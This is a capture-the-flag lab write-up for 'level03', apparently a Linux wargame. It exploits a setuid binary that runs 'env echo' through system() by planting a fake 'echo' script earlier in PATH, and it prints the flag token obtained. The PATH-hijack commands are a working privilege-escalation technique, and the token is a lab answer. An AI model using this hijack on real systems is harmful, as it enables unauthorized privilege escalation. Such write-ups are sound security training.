# level03

## Goal
Run `getflag` with `flag03`'s privileges by exploiting the SUID binary in `~`.

## Recon
```sh
$ ls -l ~
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
$ file ~/level03
setuid setgid ELF 32-bit LSB executable ... not stripped
$ strings ~/level03 | grep -E 'system|env'
system
/usr/bin/env echo Exploit me
```

The binary calls `system("/usr/bin/env echo Exploit me")`. `system` runs it through
`/bin/sh`, and `/usr/bin/env` resolves **`echo` via `$PATH`**. Since the binary is
setuid `flag03`, whatever `echo` resolves to executes with flag03's euid.

## Exploit - PATH hijack
Provide our own `echo` (which runs `getflag`) earlier in `$PATH`:

```sh
d=$(mktemp -d /tmp/l3.XXXXXX)
chmod 755 "$d"
printf '#!/bin/sh\ngetflag\n' > "$d/echo"
chmod 755 "$d/echo"
PATH="$d:$PATH" ~/level03
```

### The gotcha that cost the most time
`env` runs with **euid = flag03**, not level03. A default `mktemp -d` directory is
`0700` and owned by `level03`, so flag03 cannot traverse it -> `env` silently skips
our fake `echo` and finds the real `/bin/echo` (prints "Exploit me"). Note that
`/bin/sh` is `dash`, which also *resets `$PATH`/privilege hardening*, but the decisive
issue here is directory permissions. Making the dir and file `0755` fixes it.

## Result
```
$ PATH="$d:$PATH" ~/level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

- **level04 password (token):** `qi0maab88jeaj46qoumi7maus`
